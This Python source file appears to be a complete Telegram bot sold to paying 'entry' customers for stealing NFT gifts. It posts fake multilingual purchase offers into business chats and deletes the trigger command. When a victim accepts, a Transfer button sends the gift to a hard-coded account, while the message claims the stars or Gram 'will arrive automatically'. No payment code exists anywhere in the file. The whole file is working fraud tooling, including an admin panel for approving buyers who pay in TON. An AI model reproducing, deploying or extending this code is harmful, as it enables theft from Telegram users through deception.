# === PART 1 START ===
"""Telegram Business Gift Offer Bot - Command Trigger Edition"""

import asyncio
import html
import json
import logging
import os
import re
import secrets
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest, TelegramForbiddenError
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup,
    LinkPreviewOptions, Message, User,
)
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
TON_WALLET = os.getenv("TON_WALLET", "")
ENTRY_PRICE = os.getenv("ENTRY_PRICE", "5.5")
TTL_HOURS = int(os.getenv("OFFER_TTL_HOURS", "5"))
TTL_MINUTES = int(os.getenv("OFFER_TTL_MINUTES", "59"))
USERS_FILE = os.getenv("USERS_FILE", "allowed_users.json")
OFFERS_LOG = os.getenv("OFFERS_LOG", "offers.log")
RATE_LIMIT = float(os.getenv("RATE_LIMIT", "1.0"))

GIFT_RECEIVER = "bukmeker11"

if not TOKEN:
    raise SystemExit("BOT_TOKEN не задан в .env")
if not ADMIN_ID:
    raise SystemExit("ADMIN_ID не задан в .env")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("giftbot")

router = Router()

COMMAND_REGEX = re.compile(r"^купить\s+(\S+)\s+(\d+(?:[.,]\d+)?)\s*(.*)$", re.IGNORECASE | re.DOTALL)
TRIGGER_REGEX = re.compile(r"^/o_([A-Za-z0-9]{6,16})$", re.IGNORECASE)
NFT_LINK_REGEX = re.compile(r"(https?://)?t\.me/nft/([A-Za-z0-9_\-]+)", re.IGNORECASE)

STAR_EMOJI = "⭐"


def detect_lang(payload: str) -> str:
    p = payload.lower()
    if "eng" in p or re.search(r"\ben\b", p):
        return "en"
    if "kit" in p or re.search(r"\bzh\b", p):
        return "zh"
    if "arb" in p or re.search(r"\bar\b", p):
        return "ar"
    return "ru"


_rate_lock = asyncio.Lock()
_last_request: dict[int, float] = {}


async def rate_limit(user_id: int) -> bool:
    async with _rate_lock:
        now = time.monotonic()
        last = _last_request.get(user_id, 0)
        if now - last < RATE_LIMIT:
            return False
        _last_request[user_id] = now
        return True


_allowed_cache: Optional[set[int]] = None


def load_allowed() -> set[int]:
    global _allowed_cache
    if _allowed_cache is None:
        try:
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                _allowed_cache = {int(x) for x in json.load(f)}
        except (FileNotFoundError, json.JSONDecodeError):
            _allowed_cache = set()
    return _allowed_cache


def save_allowed() -> None:
    if _allowed_cache is None:
        return
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(_allowed_cache), f)
    except Exception as e:
        log.error(f"save users: {e}")


def is_allowed(user_id: int) -> bool:
    return user_id == ADMIN_ID or user_id in load_allowed()


def grant_access(user_id: int) -> None:
    load_allowed().add(user_id)
    save_allowed()


def revoke_access(user_id: int) -> None:
    load_allowed().discard(user_id)
    save_allowed()


@dataclass
class PendingTrigger:
    id: str
    price: str
    currency: str
    nft_link: str
    nft_title: str
    lang: str
    owner_id: int
    created_at: float = field(default_factory=time.time)


@dataclass
class Offer:
    id: str
    connection_id: Optional[str]
    chat_id: int
    message_id: int
    buyer_id: int
    buyer_name: str
    buyer_username: str
    price: str
    currency: str
    nft_link: str
    nft_title: str
    lang: str = "ru"
    created_at: float = field(default_factory=time.time)
    status: str = "pending"


pending_triggers: dict[str, PendingTrigger] = {}
offers: dict[str, Offer] = {}
_pending_users: set[int] = set()


def user_line(user: User) -> str:
    uname = f"@{user.username}" if user.username else "нет"
    name = html.escape(user.full_name)
    return f"ID: <code>{user.id}</code>\nИмя: {name}\nUsername: {uname}"


def admin_kb(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Добавить", callback_data=f"admin:allow:{user_id}"),
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"admin:deny:{user_id}"),
    ]])


def log_offer(offer: Offer) -> None:
    try:
        with open(OFFERS_LOG, "a", encoding="utf-8") as f:
            f.write(json.dumps({
                'id': offer.id,
                'buyer_id': offer.buyer_id,
                'buyer_name': offer.buyer_name,
                'price': offer.price,
                'currency': offer.currency,
                'nft_link': offer.nft_link,
                'nft_title': offer.nft_title,
                'status': offer.status,
                'created': datetime.fromtimestamp(offer.created_at).isoformat(),
            }, ensure_ascii=False) + "\n")
    except Exception as e:
        log.error(f"log_offer: {e}")
# === PART 1 END ===# === PART 2 START ===
async def safe_send(bot: Bot, text: str, chat_id: int,
                    business_connection_id: Optional[str],
                    kb: Optional[InlineKeyboardMarkup] = None,
                    retries: int = 3) -> Optional[Message]:
    for attempt in range(retries):
        try:
            kwargs = {
                'chat_id': chat_id,
                'text': text,
                'reply_markup': kb,
                'link_preview_options': LinkPreviewOptions(is_disabled=True),
            }
            if business_connection_id:
                kwargs['business_connection_id'] = business_connection_id
            return await bot.send_message(**kwargs)
        except TelegramRetryAfter as e:
            wait = min(e.retry_after, 60)
            log.warning(f"RetryAfter {wait}s")
            await asyncio.sleep(wait)
        except TelegramForbiddenError:
            log.error(f"User {chat_id} blocked bot")
            return None
        except TelegramBadRequest as e:
            log.error(f"BadRequest: {e}")
            return None
        except Exception as e:
            log.exception(f"send {attempt+1}: {e}")
            await asyncio.sleep(1)
    return None


async def safe_edit(bot: Bot, text: str,
                    business_connection_id: Optional[str],
                    message_id: int,
                    kb: Optional[InlineKeyboardMarkup] = None,
                    chat_id: Optional[int] = None) -> bool:
    try:
        kwargs = {'text': text, 'message_id': message_id, 'reply_markup': kb}
        if business_connection_id:
            kwargs['business_connection_id'] = business_connection_id
        else:
            kwargs['chat_id'] = chat_id
        await bot.edit_message_text(**kwargs)
        return True
    except TelegramBadRequest as e:
        if "message is not modified" in str(e).lower():
            return True
        log.warning(f"edit: {e}")
        return False
    except Exception as e:
        log.error(f"edit: {e}")
        return False


async def safe_delete(bot: Bot, chat_id: int, message_id: int,
                      business_connection_id: Optional[str] = None) -> bool:
    try:
        if business_connection_id:
            try:
                await bot.delete_business_messages(
                    business_connection_id=business_connection_id,
                    message_ids=[message_id],
                )
                return True
            except Exception:
                pass
        await bot.delete_message(chat_id=chat_id, message_id=message_id)
        return True
    except Exception as e:
        log.warning(f"delete: {e}")
        return False


def parse_nft_link(payload: str) -> tuple[str, str]:
    m = NFT_LINK_REGEX.search(payload)
    if not m:
        return "", ""
    slug = m.group(2)
    link = f"https://t.me/nft/{slug}"
    title_raw = slug.replace("-", " ")
    m2 = re.match(r"^(.+?)\s+(\d+)$", title_raw)
    if m2:
        title = f"{m2.group(1)} #{m2.group(2)}"
    else:
        title = title_raw
    return link, title


def detect_currency(payload: str) -> str:
    p = payload.lower()
    for word in ("gram", "грам"):
        if word in p:
            return "Gram"
    return STAR_EMOJI


GIFT_EMOJI = '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'


def ttl_text(lang: str) -> str:
    texts = {
        "en": f"{TTL_HOURS} h {TTL_MINUTES} min",
        "zh": f"{TTL_HOURS} 小时 {TTL_MINUTES} 分钟",
        "ar": f"{TTL_HOURS} ساعة و {TTL_MINUTES} دقيقة",
    }
    return texts.get(lang, f"{TTL_HOURS} ч {TTL_MINUTES} мин")


def text_offer(o: Offer) -> str:
    name = html.escape(o.buyer_name)
    title = html.escape(o.nft_title)
    ttl = ttl_text(o.lang)
    texts = {
        "en": (f"User <b>{name}</b> offers you <b>{o.price} {o.currency}</b> "
               f"for the gift <b>{title}</b>.\n\nThe offer is valid for <b>{ttl}</b>."),
        "zh": (f"用户 <b>{name}</b> 出价 <b>{o.price} {o.currency}</b> "
               f"购买礼物 <b>{title}</b>。\n\n报价有效期 <b>{ttl}</b>。"),
        "ar": (f"المستخدم <b>{name}</b> يعرض عليك <b>{o.price} {o.currency}</b> "
               f"مقابل الهدية <b>{title}</b>.\n\nالعرض صالح لمدة <b>{ttl}</b>."),
        "ru": (f"Пользователь <b>{name}</b> предлагает Вам <b>{o.price} {o.currency}</b> "
               f"за подарок <b>{title}</b>.\n\nПредложение действует ещё <b>{ttl}</b>."),
    }
    return texts.get(o.lang, texts["ru"])


def text_declined(o: Offer) -> str:
    return {"en": "❌ Offer declined", "zh": "❌ 报价已被拒绝",
            "ar": "❌ تم رفض العرض"}.get(o.lang, "❌ Предложение отклонено")


def text_sold(o: Offer) -> str:
    title = html.escape(o.nft_title)
    link = o.nft_link or "https://t.me/nft/"
    texts = {
        "en": f"{GIFT_EMOJI} Deal confirmed!\n\n• Gift: <b>{title}</b>\n• Link: {link}\n\n• Tap «Transfer» to send the gift and receive {o.currency}.",
        "zh": f"{GIFT_EMOJI} 交易确认！\n\n• 礼物：<b>{title}</b>\n• 链接：{link}\n\n• 点击「转赠」发送礼物即可到账 {o.currency}。",
        "ar": f"{GIFT_EMOJI} تم تأكيد الصفقة!\n\n• الهدية: <b>{title}</b>\n• الرابط: {link}\n\n• اضغط «إرسال» لإرسال الهدية واستلام {o.currency}.",
        "ru": f"{GIFT_EMOJI} Сделка подтверждена!\n\n• Подарок: <b>{title}</b>\n• Ссылка: {link}\n\n• Нажмите «Передать» и отправьте подарок — {o.currency} придут автоматически.",
    }
    return texts.get(o.lang, texts["ru"])


def text_expired(lang: str) -> str:
    return {"en": "⏳ The offer has expired", "zh": "⏳ 报价已过期",
            "ar": "⏳ انتهت صلاحية العرض"}.get(lang, "⏳ Время предложения истекло")


def text_sent_alert(lang: str) -> str:
    return {"en": "✅ Thank you! The gift has been sent", "zh": "✅ 谢谢！礼物已发送",
            "ar": "✅ شكراً! تم إرسال الهدية"}.get(lang, "✅ Спасибо! Подарок отправлен")


def text_decline_alert(lang: str) -> str:
    return {"en": "❌ Declined", "zh": "❌ 已拒绝", "ar": "❌ تم الرفض"}.get(lang, "❌ Отклонено")


def text_accept_alert(o: Offer) -> str:
    buyer = o.buyer_name[:30] + "..." if len(o.buyer_name) > 30 else o.buyer_name
    if not o.buyer_username or o.buyer_username.isdigit():
        return f"⚠️ У покупателя нет @username\nОтправьте подарок вручную на ID: {o.buyer_id}"
    return f"✅ Оффер принят.\nПередайте подарок пользователю {buyer}."


def kb_offer(o: Offer) -> InlineKeyboardMarkup:
    labels = {"en": ("✓ Accept", "✕ Decline"), "zh": ("✓ 接受", "✕ 拒绝"),
              "ar": ("✓ قبول", "✕ رفض")}.get(o.lang, ("✓ Принять", "✕ Отклонить"))
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=labels[1], callback_data=f"decline:{o.id}"),
        InlineKeyboardButton(text=labels[0], callback_data=f"accept:{o.id}"),
    ]])


def kb_sold(o: Offer) -> InlineKeyboardMarkup:
    label = {"en": "Transfer", "zh": "转赠", "ar": "إرسال"}.get(o.lang, "Передать")
    confirm = {"en": "✓ I sent the gift", "zh": "✓ 我已发送礼物",
               "ar": "✓ لقد أرسلت الهدية"}.get(o.lang, "✓ Я отправил подарок")
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=label, url=f"tg://send_gift?to={GIFT_RECEIVER}")],
        [InlineKeyboardButton(text=confirm, callback_data=f"sent:{o.id}")],
    ])
# === PART 2 END ===# === PART 3 START ===
@router.message(CommandStart(), F.chat.type == "private")
async def cmd_start(message: Message, bot: Bot) -> None:
    user = message.from_user
    if not user:
        return
    if is_allowed(user.id):
        await message.answer(
            "👋 Привет!\n\n✅ Доступ активен.\n\n"
            "Создать оффер:\n"
            "<code>купить https://t.me/nft/KissedFrog-10226 250</code>\n\n"
            "Бот выдаст одноразовую команду — вставьте её в бизнес-чат."
        )
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="🔑 Купить вход", callback_data="entry:start")
    ]])
    await message.answer(
        f"👋 Привет! Это бот офферов {GIFT_EMOJI}\n\nВход стоит <b>{ENTRY_PRICE} TON</b>",
        reply_markup=kb
    )


@router.message(F.chat.type == "private", F.text.regexp(COMMAND_REGEX.pattern))
async def create_trigger(message: Message, bot: Bot) -> None:
    user = message.from_user
    if not user or not is_allowed(user.id):
        await message.answer("⛔️ Нет доступа. Нажмите /start")
        return
    if not await rate_limit(user.id):
        return
    match = COMMAND_REGEX.match(message.text.strip())
    if not match:
        return
    nft_raw = match.group(1).strip()
    price_raw = match.group(2).strip()
    rest = match.group(3).strip()

    link, title = parse_nft_link(nft_raw)
    if not link:
        await message.answer("⚠️ Неверная ссылка на NFT.\nПример: <code>https://t.me/nft/KissedFrog-10226</code>")
        return
    try:
        price_val = float(price_raw.replace(",", "."))
        if price_val <= 0 or price_val >= 10_000_000:
            raise ValueError
        price = str(int(price_val)) if price_val == int(price_val) else f"{price_val:g}"
    except ValueError:
        await message.answer("⚠️ Неверная цена.")
        return

    lang = detect_lang(rest) if rest else "ru"
    currency = detect_currency(rest) if rest else STAR_EMOJI

    trig_id = secrets.token_hex(4)
    trig = PendingTrigger(
        id=trig_id, price=price, currency=currency,
        nft_link=link, nft_title=title, lang=lang, owner_id=user.id,
    )
    pending_triggers[trig_id] = trig
    log.info(f"trigger: {trig_id} | {price} {currency} | {title} | owner={user.id}")

    command_text = f"/o_{trig_id}"
    await message.answer(
        f"✅ Команда создана.\n\n"
        f"Подарок: <b>{html.escape(title)}</b>\n"
        f"Цена: <b>{price} {currency}</b>\n"
        f"Время: {ttl_text(lang)}\n\n"
        f"Вставьте эту команду в бизнес-чат:\n"
        f"<code>{command_text}</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="📋 Скопировать команду", copy_text={"text": command_text})
        ]])
    )


@router.business_message(F.text)
async def trigger_offer(message: Message, bot: Bot) -> None:
    if not message.text or not message.business_connection_id:
        return
    m = TRIGGER_REGEX.match(message.text.strip())
    if not m:
        return
    trig_id = m.group(1).lower()
    trig = pending_triggers.get(trig_id)
    if not trig:
        await safe_send(bot, "⚠️ Команда не найдена или устарела.",
                        message.chat.id, message.business_connection_id)
        await safe_delete(bot, message.chat.id, message.message_id, message.business_connection_id)
        return
    if message.from_user and message.from_user.id != trig.owner_id:
        await safe_send(bot, "⚠️ Это не ваша команда.",
                        message.chat.id, message.business_connection_id)
        await safe_delete(bot, message.chat.id, message.message_id, message.business_connection_id)
        return
    try:
        connection = await bot.get_business_connection(
            business_connection_id=message.business_connection_id)
        buyer = connection.user
        buyer_id = buyer.id
        buyer_name = f"@{buyer.username}" if buyer.username else buyer.full_name
        buyer_username = buyer.username if buyer.username else str(buyer.id)

        offer_id = secrets.token_urlsafe(8)
        offer = Offer(
            id=offer_id, connection_id=message.business_connection_id,
            chat_id=message.chat.id, message_id=message.message_id,
            buyer_id=buyer_id, buyer_name=buyer_name, buyer_username=buyer_username,
            price=trig.price, currency=trig.currency,
            nft_link=trig.nft_link, nft_title=trig.nft_title, lang=trig.lang,
        )
        sent = await safe_send(bot, text_offer(offer), message.chat.id,
                               message.business_connection_id, kb_offer(offer))
        if not sent:
            return
        offer.message_id = sent.message_id
        offers[offer_id] = offer
        log_offer(offer)
        pending_triggers.pop(trig_id, None)
        await safe_delete(bot, message.chat.id, message.message_id, message.business_connection_id)
    except Exception as e:
        log.exception(f"trigger_offer: {e}")


@router.callback_query(F.data.startswith(("accept:", "decline:")))
async def resolve_offer(cb: CallbackQuery, bot: Bot) -> None:
    try:
        action, offer_id = cb.data.split(":", 1)
    except Exception:
        await cb.answer("❌ Ошибка", show_alert=True)
        return
    offer = offers.get(offer_id)
    if not offer:
        await cb.answer("⚠️ Оффер не найден или истёк", show_alert=True)
        return
    if action == "decline":
        offer.status = "declined"
        log_offer(offer)
        await safe_edit(bot, text_declined(offer), offer.connection_id,
                        offer.message_id, None, offer.chat_id)
        offers.pop(offer_id, None)
        await cb.answer(text_decline_alert(offer.lang))
    else:
        offer.status = "accepted"
        log_offer(offer)
        edited = await safe_edit(bot, text_sold(offer), offer.connection_id,
                                 offer.message_id, kb_sold(offer), offer.chat_id)
        if not edited:
            await safe_send(bot, text_sold(offer), offer.chat_id,
                            offer.connection_id, kb_sold(offer))
        alert = text_accept_alert(offer)
        if len(alert) > 200:
            alert = alert[:197] + "..."
        await cb.answer(alert, show_alert=True)


@router.callback_query(F.data.startswith("sent:"))
async def confirm_sent(cb: CallbackQuery, bot: Bot) -> None:
    try:
        _, offer_id = cb.data.split(":", 1)
    except Exception:
        await cb.answer("❌ Ошибка", show_alert=True)
        return
    offer = offers.get(offer_id)
    if not offer:
        await cb.answer("✅ Уже подтверждено", show_alert=True)
        return
    offer.status = "completed"
    log_offer(offer)
    await cb.answer(text_sent_alert(offer.lang), show_alert=True)
    if ADMIN_ID:
        try:
            await bot.send_message(
                ADMIN_ID,
                f"✅ <b>Продажа завершена</b>\n\nОффер: <code>{offer_id}</code>\n"
                f"Подарок: {html.escape(offer.nft_title)}\n"
                f"Цена: {offer.price} {offer.currency}\n"
                f"Покупатель: {html.escape(offer.buyer_name)}"
            )
        except Exception:
            pass
    offers.pop(offer_id, None)
# === PART 3 END ===# === PART 4 START ===
@router.callback_query(F.data == "entry:start")
async def entry_start(cb: CallbackQuery, bot: Bot) -> None:
    if is_allowed(cb.from_user.id):
        await cb.answer("✅ Доступ уже есть", show_alert=True)
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Я оплатил", callback_data="entry:paid")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="entry:back")],
    ])
    try:
        await cb.message.edit_text(
            f"💳 <b>Оплата входа</b>\n\nСумма: <b>{ENTRY_PRICE} TON</b>\n"
            f"Адрес: <code>{html.escape(TON_WALLET)}</code>\n\n"
            f"После оплаты нажмите «Я оплатил» и пришлите скриншот.",
            reply_markup=kb
        )
    except Exception:
        pass
    await cb.answer()


@router.callback_query(F.data == "entry:back")
async def entry_back(cb: CallbackQuery, bot: Bot) -> None:
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="🔑 Купить вход", callback_data="entry:start")
    ]])
    try:
        await cb.message.edit_text(
            f"👋 Привет! Это бот офферов {GIFT_EMOJI}\n\nВход стоит <b>{ENTRY_PRICE} TON</b>",
            reply_markup=kb
        )
    except Exception:
        pass
    await cb.answer()


@router.callback_query(F.data == "entry:paid")
async def entry_paid(cb: CallbackQuery, bot: Bot) -> None:
    user = cb.from_user
    if is_allowed(user.id):
        await cb.answer("✅ Доступ уже есть", show_alert=True)
        return
    _pending_users.add(user.id)
    try:
        await cb.message.edit_text("📸 Пришлите скриншот перевода")
    except Exception:
        pass
    try:
        await bot.send_message(ADMIN_ID, f"🔔 <b>Заявка на вход</b>\n\n{user_line(user)}",
                               reply_markup=admin_kb(user.id))
    except Exception as e:
        log.error(f"admin notify: {e}")
    await cb.answer("✅ Заявка отправлена")


@router.message(F.photo | F.document, F.chat.type == "private")
async def on_screenshot(message: Message, bot: Bot) -> None:
    user = message.from_user
    if not user:
        return
    if user.id != ADMIN_ID and user.id not in _pending_users:
        return
    _pending_users.discard(user.id)
    try:
        await bot.copy_message(
            chat_id=ADMIN_ID, from_chat_id=message.chat.id,
            message_id=message.message_id,
            caption=f"📸 <b>Скриншот оплаты</b>\n\n{user_line(user)}",
            reply_markup=admin_kb(user.id),
        )
        await message.answer("✅ Скриншот отправлен")
    except Exception as e:
        log.error(f"screenshot: {e}")


@router.message(Command("ledgerteam"), F.chat.type == "private")
async def cmd_ledgerteam(message: Message, bot: Bot) -> None:
    user = message.from_user
    if not user or is_allowed(user.id):
        return
    try:
        await bot.send_message(ADMIN_ID, f"🚀 <b>Заявка /ledgerteam</b>\n\n{user_line(user)}",
                               reply_markup=admin_kb(user.id))
        await message.answer("✅ Заявка отправлена")
    except Exception:
        pass


@router.callback_query(F.data.startswith(("admin:allow:", "admin:deny:")))
async def admin_decision(cb: CallbackQuery, bot: Bot) -> None:
    if cb.from_user.id != ADMIN_ID:
        await cb.answer("❌ Нет прав", show_alert=True)
        return
    try:
        _, action, raw = cb.data.split(":", 2)
        user_id = int(raw)
    except Exception:
        await cb.answer("❌ Ошибка", show_alert=True)
        return
    if action == "allow":
        grant_access(user_id)
        _pending_users.discard(user_id)
        try:
            await bot.send_message(user_id, "✅ <b>Вам выдан доступ!</b>\n\n/start")
        except Exception:
            pass
        try:
            await cb.message.edit_text(cb.message.html_text + "\n\n— ✅ <b>Добавлен</b>")
        except Exception:
            pass
        await cb.answer("✅ Добавлен")
    else:
        _pending_users.discard(user_id)
        try:
            await bot.send_message(user_id, "❌ Отклонено.")
        except Exception:
            pass
        try:
            await cb.message.edit_text(cb.message.html_text + "\n\n— ❌ <b>Отклонено</b>")
        except Exception:
            pass
        await cb.answer("❌ Отклонено")


@router.message(Command("grant"), F.chat.type == "private")
async def cmd_grant(message: Message, bot: Bot) -> None:
    if message.from_user.id != ADMIN_ID:
        return
    try:
        user_id = int(message.text.split()[1])
        grant_access(user_id)
        await message.answer(f"✅ Доступ выдан: <code>{user_id}</code>")
    except Exception:
        await message.answer("❌ Формат: /grant USER_ID")


@router.message(Command("revoke"), F.chat.type == "private")
async def cmd_revoke(message: Message, bot: Bot) -> None:
    if message.from_user.id != ADMIN_ID:
        return
    try:
        user_id = int(message.text.split()[1])
        revoke_access(user_id)
        await message.answer(f"🚫 Доступ удалён: <code>{user_id}</code>")
    except Exception:
        await message.answer("❌ Формат: /revoke USER_ID")


@router.message(Command("users"), F.chat.type == "private")
async def cmd_users(message: Message, bot: Bot) -> None:
    if message.from_user.id != ADMIN_ID:
        return
    users = sorted(load_allowed())
    if not users:
        await message.answer("👥 Список пуст")
        return
    await message.answer(f"👥 <b>Пользователей: {len(users)}</b>\n\n" +
                         "\n".join(f"• <code>{u}</code>" for u in users))


@router.message(Command("stats"), F.chat.type == "private")
async def cmd_stats(message: Message, bot: Bot) -> None:
    if message.from_user.id != ADMIN_ID:
        return
    alive = sum(1 for o in offers.values() if o.status == "pending")
    await message.answer(
        f"📊 <b>Статистика</b>\n\n"
        f"Активных офферов: <b>{alive}</b>\n"
        f"Всего в памяти: <b>{len(offers)}</b>\n"
        f"Триггеров в ожидании: <b>{len(pending_triggers)}</b>\n"
        f"Пользователей с доступом: <b>{len(load_allowed())}</b>"
    )


# ---------- ФОН ----------

bot_global: Optional[Bot] = None


async def cleanup_offers() -> None:
    while True:
        try:
            await asyncio.sleep(60)
            now = time.time()

            expired = [
                oid for oid, o in offers.items()
                if now - o.created_at > TTL_HOURS * 3600 + TTL_MINUTES * 60
            ]
            for oid in expired:
                offer = offers.pop(oid, None)
                if offer and bot_global:
                    offer.status = "expired"
                    log_offer(offer)
                    await safe_edit(
                        bot_global, text_expired(offer.lang),
                        offer.connection_id, offer.message_id, None, offer.chat_id,
                    )
            if expired:
                log.info(f"expired offers: {len(expired)}")

            stale_triggers = [
                tid for tid, t in pending_triggers.items()
                if now - t.created_at > 3600
            ]
            for tid in stale_triggers:
                pending_triggers.pop(tid, None)
            if stale_triggers:
                log.info(f"stale triggers: {len(stale_triggers)}")
        except Exception as e:
            log.error(f"cleanup: {e}")


async def main() -> None:
    global bot_global
    log.info("Запуск Gift Offer Bot")
    session = AiohttpSession(timeout=30)
    bot_global = Bot(
        TOKEN,
        default=DefaultBotProperties(parse_mode="HTML"),
        session=session,
    )
    dp = Dispatcher()
    dp.include_router(router)
    asyncio.create_task(cleanup_offers())
    try:
        me = await bot_global.get_me()
        log.info(f"bot: @{me.username} ({me.id})")
        log.info(f"admin: {ADMIN_ID}")
        log.info(f"access: {len(load_allowed())}")
        await dp.start_polling(
            bot_global,
            allowed_updates=["message", "callback_query",
                             "business_message", "business_connection"],
        )
    finally:
        await bot_global.session.close()
        log.info("bot stopped")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("interrupted")
    except Exception as e:
        log.exception(f"fatal: {e}")
# === PART 4 END ===
